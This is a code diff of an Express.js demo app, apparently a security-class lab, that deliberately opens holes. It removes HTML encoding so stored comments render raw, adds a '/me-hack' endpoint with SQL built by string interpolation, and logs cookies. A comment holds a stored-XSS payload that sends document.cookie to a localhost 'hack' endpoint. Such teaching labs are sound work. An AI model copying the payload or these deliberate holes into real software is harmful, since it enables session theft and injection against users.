@@ -1,6 +1,9 @@
 const express = require("express");
 const port = parseInt(process.env.PORT, 10) || 3000;
 const htmlencode = require("htmlencode");
+const cors = require("cors");
+const cookieParser = require("cookie-parser");
+const session = require("express-session");
 
 /* Example of stored xss
 <script>var url = `http://localhost:3001/hack?victimCookie=${document.cookie}`;document.write(`<img src="${url}"/>`);</script>
@@ -27,9 +30,10 @@ const DB_CONNECTION = {
   port: 5432,
 };
 
-const session = require("express-session");
 const app = express();
 
+// app.use(cors());
+app.use(cookieParser());
 app.use(
   session({
     /* FIXME creating a vulnerability on purpose. Now I am able to acess cookies in the browser */
@@ -51,6 +55,8 @@ const fetchAndRenderCommentsList = async () => {
     const selectQuery = `select * from comment`;
     const commentRecords = await client.query(selectQuery);
 
+    // <p>${htmlencode.htmlEncode(comment)}</p>
+
     let commentItemsHtml = "";
     commentRecords.rows.forEach(({ user_email, user_name, comment }) => {
       commentItemsHtml += `<li style="border:1px solid; margin-bottom:5px; padding: 5px;">
@@ -58,7 +64,7 @@ const fetchAndRenderCommentsList = async () => {
                 <p><strong>Name:</strong> ${user_name}</p>
                 <div>
                     <p><strong>Comment:</strong></p>
-                    <p>${htmlencode.htmlEncode(comment)}</p>
+                    <p>${comment}</p>                   
                 </div>
             </li>`;
     });
@@ -73,6 +79,7 @@ const fetchAndRenderCommentsList = async () => {
 };
 
 app.get("/", (req, res) => {
+  // res.set("Access-Control-Allow-Credentials", "true");
   console.log("Session ID: ", req.sessionID);
 
   return res.send(`<html>
@@ -240,7 +247,8 @@ app.get("/signup", (req, res) => {
 });
 
 app.get("/me", async (req, res) => {
-  console.log("Session ID: ", req.sessionID);
+  console.log("Cookies: ", req.cookies);
+  console.log("Users: ", req.sessionID);
   const client = new Client(DB_CONNECTION);
 
   try {
@@ -274,7 +282,43 @@ app.get("/me", async (req, res) => {
             </main>
         </html>`);
   } catch (error) {
+    console.log("error: ", error);
     res.redirect("/");
+  } finally {
+    client.end();
+  }
+});
+
+app.get("/cors", (req, res) => {
+  console.log("Cookies: ", req.cookies);
+  res.json({
+    subject: "ddss",
+    year: 2019,
+  });
+});
+
+app.get("/me-hack", async (req, res) => {
+  // res.set("Access-Control-Allow-Credentials", "true");
+  console.log("Cookies: ", req.cookies);
+  console.log("Session ID: ", req.sessionID);
+  const client = new Client(DB_CONNECTION);
+
+  try {
+    client.connect();
+
+    const currentSessionQuery = `select * from user_session where session_id = '${req.sessionID}'`;
+
+    const sessionRows = await client.query(currentSessionQuery);
+
+    // Check authentication
+    const isAuthValid = !!(sessionRows && sessionRows.rowCount === 1);
+
+    if (!isAuthValid) {
+      res.status(200).send(JSON.stringify({ message: "No session" }));
+      return;
+    }
+
+    res.status(200).send(JSON.stringify(sessionRows.rows[0]));
   } finally {
     client.end();
   }
@@ -451,7 +495,7 @@ app.get("/search_payments", async (req, res) => {
                 <td>${security_code}</td>
             </tr>`;
     });
-
+    // ${htmlencode.htmlEncode(date)}
     const htmlResponse = `<html>
             <main>
                 <h3>Your Payments at ${date}</h3>
@@ -469,9 +513,6 @@ app.get("/search_payments", async (req, res) => {
                 </table>
             </main>
         </html>`;
-
-    // TODO to remove, letting an open vulnerability for reflected XSS
-    // res.set('X-XSS-Protection', 0);
 
     res.send(htmlResponse);
   } catch (error) {
